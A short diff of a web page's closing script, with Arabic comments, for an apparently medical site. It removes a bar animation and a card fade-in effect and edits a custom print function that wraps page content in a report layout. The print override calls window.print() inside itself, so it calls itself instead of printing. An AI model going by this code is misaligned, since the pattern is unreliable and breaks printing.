-      document.querySelectorAll('.fba').forEach(b => b.style.height = (20+Math.random()*75)+'%'); 
-      setTimeout(uf, 800+Math.random()*1000) 
-    }
-    uf();
-    
-    // === تأثيرات الظهور للبطاقات ===
-    const ob = new IntersectionObserver(es => {
-      es.forEach(e => { 
-        if(e.isIntersecting){ 
-          e.target.style.opacity='1'; 
-          e.target.style.transform='translateY(0)' 
-        } 
-      })
-    }, { threshold: .1 });
-    
-    document.querySelectorAll('.lc').forEach(c => {
-      c.style.opacity='0'; 
-      c.style.transform='translateY(20px)'; 
-      c.style.transition='all .6s ease'; 
-      ob.observe(c)
-    });
-    
     // === طباعة مخصصة ===
     window.print = function(){
-      const c = document.querySelector('.rc').innerHTML;
+      const content = document.querySelector('.main-container').innerHTML;
       document.body.innerHTML = `<div style="padding:40px;font-family:'Tajawal',sans-serif;direction:rtl;text-align:right">
-        <h1 style="color:#00d4aa;margin-bottom:30px">📊 تقرير الموقع الطبي</h1>${c}
+        <h1 style="color:#00d4aa;margin-bottom:30px">🌍 تقرير الموقع الطبي</h1>${content}
         <div style="margin-top:40px;padding-top:20px;border-top:2px solid #00d4aa;color:#666">
           <p>تم إنشاء هذا التقرير بواسطة نظام د. العظام المتخصص</p>
           <p style="margin-top:5px">التاريخ: ${new Date().toLocaleDateString('ar-EG')}</p>
         </div></div>`;
-      window.print(); 
-      location.reload();
+      window.print(); location.reload();
     };
   </script>
 </body>
